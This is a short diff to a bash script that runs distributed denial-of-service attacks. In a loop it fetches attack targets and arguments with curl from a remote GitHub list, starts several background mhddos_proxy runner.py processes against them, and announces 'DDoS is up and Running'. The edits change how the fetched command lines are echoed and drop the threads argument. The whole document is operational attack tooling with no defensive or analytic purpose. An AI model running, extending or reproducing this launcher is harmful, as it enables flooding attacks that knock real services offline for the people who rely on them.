@@ -45,22 +45,22 @@ do
 
    # Print all randomly selected targets on screen
    echo -e "Choosen target(s): "
-   for i in $random_numbers
-   do
-             target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
-             echo -e "    "$target"\n"
-   done
+   #for i in $random_numbers
+   #do
+   #          target=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
+   #          echo -e "    "$target"\n"
+   #done
 
    # Launch multiple mhddos_proxy instances with different targets.
    for i in $random_numbers
    do
             # Filter and only get lines that starts with "runner.py". Then get one target from that filtered list.
             cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Maxssaf/target/main/runner_targets | cat | grep "^[^#]")")
-
+            echo -e "    "$cmd_line"\n"
             #echo $cmd_line
             #echo $cmd_line $proxy_interval $threads $rpc
             cd ~/mhddos_proxy
-            python3 runner.py --debug $cmd_line $proxy_interval $threads $rpc&
+            python3 runner.py --debug $cmd_line $proxy_interval $rpc&    ##$threads
             echo -e "Attack started. Wait a few minutes for output"
    done
 echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
